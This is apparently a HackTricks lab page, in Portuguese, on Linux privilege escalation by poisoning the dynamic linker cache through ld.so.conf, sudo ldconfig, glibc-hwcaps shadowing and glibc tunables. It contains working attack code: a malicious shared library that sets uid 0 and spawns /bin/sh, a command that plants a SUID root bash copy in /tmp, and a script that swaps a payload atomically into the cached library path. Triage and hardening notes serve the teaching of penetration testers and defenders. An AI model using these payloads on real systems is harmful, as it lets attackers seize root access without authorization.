# exemplo de exploit de privesc do ld.so

{{#include ../../banners/hacktricks-training.md}}

Esta página é um laboratório focado em envenenar o **cache do linker do sistema por meio de `/etc/ld.so.conf` ou `ldconfig`**. Para injeção de bibliotecas ausentes, `RPATH`/`RUNPATH` graváveis, `LD_PRELOAD` e outros abusos genéricos do linker com SUID, consulte [Abuso de Shared Library e Linker do SUID](suid-shared-library-and-linker-abuse.md).

## Preparar o ambiente

Na seção a seguir, você encontrará o código dos arquivos que usaremos para preparar o ambiente.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Crie** esses arquivos na sua máquina, na mesma pasta
2. **Compile a biblioteca**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copie** `libcustom.so` para `/usr/lib` e atualize o cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (privilégios de root)
4. **Compile o executável**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Verifique o ambiente

Verifique se _libcustom.so_ está sendo **carregado** de _/usr/lib_ e se você consegue **executar** o binário.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Comandos úteis de triagem

Ao atacar um alvo real, verifique o **nome exato da biblioteca** de que o binário precisa, o que o loader está **resolvendo atualmente** e quais caminhos configurados podem ser gravados sem modificar o cache ativo.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Use `ldd` somente em um executável **confiável**. Algumas implementações ou interpretadores ELF incomuns podem fazer com que ele execute código controlado pelo atacante; `objdump -p ./file | grep NEEDED` lista com segurança as dependências diretas. Para um alvo confiável, invocar o interpretador descoberto com `--list` mostra a resolução real. Compare essa saída com `--inhibit-cache --list`: uma diferença comprova que `/etc/ld.so.cache`, e não uma regra comum de caminho de pesquisa, selecionou o objeto.<sup>[[1]](#references)[[4]](#references)</sup>

Alguns detalhes importantes:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` normalmente **não funciona**, porque
o redirecionamento é feito pelo seu shell atual. Em vez disso, use
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- Binários **SUID/privilegiados** são executados no **secure-execution mode**: `LD_LIBRARY_PATH`
é ignorado, enquanto `LD_PRELOAD` é restrito (nomes que contêm barras são
ignorados, e somente libraries marcadas com setuid em diretórios padrão podem ser
preloaded). Quando o root executa `ldconfig`, os diretórios listados em
`/etc/ld.so.conf` podem entrar em `/etc/ld.so.cache`; portanto, essa
misconfiguration ainda pode afetar programas privilegiados.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` também é ignorado no secure-execution mode, a menos que `/etc/suid-debug` exista; portanto, colete seu trace a partir de uma execução não-SUID equivalente, em vez de esperar uma saída da execução privilegiada.<sup>[[1]](#references)</sup>
- No glibc 2.33 e versões mais recentes, o dynamic loader também expõe
`--list-diagnostics`, que imprime diagnósticos legíveis por máquina do loader e
informações sobre os search paths integrados quando um hijack não se comporta como esperado.<sup>[[1]](#references)[[6]](#references)</sup>

### Restrições de cache e SONAME

`ldconfig` não armazena em cache todo arquivo arbitrário em um diretório configurado: ele examina os headers ELF, reconhece nomes correspondentes a `lib*.so*` ou `ld-*.so*` e espera a cadeia convencional `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Portanto, o objeto injetado deve ter a architecture/class do alvo, o nome exato de `DT_NEEDED` (normalmente seu `DT_SONAME`) e quaisquer symbols/versions que o victim resolva.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Prefira uma biblioteca específica do alvo, como neste exemplo. Fazer Shadowing de um SONAME comum com um objeto incompleto pode interromper todos os processos que o resolvem antes que o alvo privilegiado pretendido seja executado.<sup>[[3]](#references)</sup>

### Persistência de caminhos em cache e trocas atômicas

O cache registra um mapeamento de **nome da biblioteca para caminho**; ele não incorpora o objeto compartilhado. Depois que um caminho controlado pelo atacante é armazenado em cache, substituir o objeto nesse caminho exato afeta os processos iniciados posteriormente sem outra execução do `ldconfig`. Isso possibilita um padrão útil de time-of-check/time-of-use: disponibilizar uma biblioteca válida durante a reconstrução ou inspeção do cache por um administrador e, em seguida, renomear atomicamente o payload para substituí-la. Os processos existentes continuam usando o objeto que já têm mapeado.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
Da mesma forma, excluir a linha maliciosa de `ld.so.conf` não remove, por si só, uma entrada já gravada: o administrador deve remover o objeto não confiável, corrigir a propriedade/permissão de escrita e reconstruir o cache. Use a comparação com `--inhibit-cache` acima para distinguir uma entrada obsoleta no cache de um caminho de configuração ainda ativo.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

Neste cenário, suponha que um administrador tenha adicionado uma entrada vulnerável a um arquivo em
`/etc/ld.so.conf.d/` incluído pelo
`/etc/ld.so.conf` do sistema.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
A pasta vulnerável é _/home/ubuntu/lib_ (onde temos acesso de escrita).\
**Baixe e compile** o código a seguir dentro desse caminho:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Se você espera que o **root** (ou outra conta privilegiada) execute o binário vulnerável posteriormente, geralmente é melhor deixar um **artefato pertencente ao root** em vez de iniciar um shell interativo. Por exemplo:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Então, após ocorrer a execução privilegiada, você pode usar `/tmp/rootbash -p`.

Agora que **criamos a biblioteca maliciosa libcustom dentro do caminho configurado incorretamente**, o cache padrão precisa ser reconstruído por uma execução privilegiada bem-sucedida de **`ldconfig`**. Uma reinicialização ajuda apenas quando o processo de inicialização local realmente o executa; caso contrário, aguarde uma ação do administrador ou use uma regra insegura do sudo, se houver uma disponível.<sup>[[2]](#references)</sup>

Depois que isso acontecer, **verifique novamente** de onde o executável `sharedvuln` está carregando a biblioteca `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Como você pode ver, ele está **carregando-o de `/home/ubuntu/lib`** e, se qualquer usuário o executar, um shell será executado:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Note que, neste exemplo, não escalamos privilégios, mas, modificando os comandos executados e **aguardando que o root ou outro usuário privilegiado execute o binário vulnerável**, poderemos escalar privilégios.

### Shadowing de `glibc-hwcaps`

Desde a glibc 2.33, o loader pode preferir bibliotecas otimizadas abaixo de `glibc-hwcaps/<level>/` dentro de **cada diretório de pesquisa de bibliotecas**. Consequentemente, verificar apenas `/home/ubuntu/lib` é insuficiente: um subdiretório compatível e com permissão de escrita, como `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, pode fazer shadowing da biblioteca base depois que o `ldconfig` a indexar, enquanto outras CPUs continuam usando o objeto base. Isso também fornece um hijack seletivo por arquitetura que pode não ser detectado quando a validação ocorre em uma CPU diferente.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
As orientações atuais de hardening do glibc recomendam evitar SONAMEs duplicados, locais de pesquisa não padrão e objetos em subdiretórios `glibc-hwcaps`. Do ponto de vista de auditoria, aplique recursivamente verificações de propriedade e permissões de escrita aos diretórios configurados e a seus componentes de caminho pai.<sup>[[3]](#references)</sup>

### Other misconfigurations - Same vuln

No exemplo anterior, simulamos uma configuração incorreta na qual um administrador **definiu uma pasta não privilegiada dentro de um arquivo de configuração localizado em `/etc/ld.so.conf.d/`**.\
Mas existem outras configurações incorretas que podem causar a mesma vulnerabilidade: se você tiver **permissões de escrita** em um **arquivo de configuração** carregado, puder criar um arquivo em um diretório `/etc/ld.so.conf.d/` com permissão de escrita ou puder escrever em `/etc/ld.so.conf`, poderá configurar e explorar a mesma vulnerabilidade.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Suponha que você tenha privilégios sudo sobre `ldconfig`**. `ldconfig` aceita diretórios de busca como argumentos posicionais, portanto, a forma mais curta de envenenamento do cache geralmente é simplesmente:<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
Como alternativa, `-f` seleciona outro arquivo de configuração mantendo a saída padrão do cache. Isso é útil quando um filtro de argumentos bloqueia diretórios posicionais, mas ainda permite `-f`, ou quando vários caminhos precisam ser injetados:<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Agora, conforme indicado no **exploit anterior**, **crie a biblioteca maliciosa dentro de `/tmp`**.\
E, por fim, vamos carregar o path e verificar de onde o binário está carregando a biblioteca:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Como você pode ver, tendo privilégios sudo sobre `ldconfig`, você pode explorar a mesma vulnerabilidade.** Os detalhes das opções são importantes ao avaliar uma regra sudo restrita: `-f` seleciona outra configuração, mas ainda reconstrói `/etc/ld.so.cache`; `-C` redireciona o cache para outro local; `-N` impede a reconstrução do cache; e `-X` impede atualizações de links, mas **ainda reconstrói o cache, a menos que seja combinado com `-N`**. `-n` implica `-N`, portanto pode atualizar links nos diretórios fornecidos, mas não pode envenenar o cache; `-r` opera abaixo de uma root alternativa e normalmente não altera o cache do host.<sup>[[2]](#references)</sup>

## glibc 2.44: tunables do sistema em cache

A partir da glibc 2.44, `ldconfig` também analisa `/etc/tunables.conf` e armazena suas configurações como uma extensão em `/etc/ld.so.cache`. O arquivo aceita diretivas `include` e filtros por processo. Os prefixos controlam o escopo: `@` tem como alvo apenas processos `AT_SECURE`, `$` os exclui, e `*` abrange ambos. Isso amplia o limite de auditoria para além dos diretórios de bibliotecas: uma configuração de tunables gravável ou um arquivo incluído pode influenciar futuras inicializações de programas após uma reconstrução privilegiada do cache.<sup>[[7]](#references)</sup>

A mesma versão adiciona `ldconfig -t TUNCONF`, que seleciona um arquivo de tunables alternativo enquanto ainda grava o cache normal, a menos que outra opção o altere. Portanto, wrappers e regras sudo que tentavam bloquear apenas `-f` também devem rejeitar `-t`, diretórios posicionais arbitrários e manipulação da saída do cache.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
Isso não é execução arbitrária de código automática. Trata-se de uma primitiva privilegiada de **loader-behavior manipulation**: a glibc alerta explicitamente que valores de todo o sistema podem aplicar tunables sensíveis à segurança a programas setuid/setgid sem uma verificação de segurança por tunable. Enumere os tunables reais do host com `--list-tunables` e procure alterações específicas do alocador, alterações de hardening da CPU ou condições de denial-of-service, em vez de presumir um payload universal.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - Página do manual do Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Página do manual do Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Hardening do Dynamic Linker - The GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Página do manual do Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Diagnósticos do Dynamic Linker (The GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [Tunables de todo o sistema (The GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Adicionar tunables de todo o sistema: parte do ldconfig (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
{{#include ../../banners/hacktricks-training.md}}
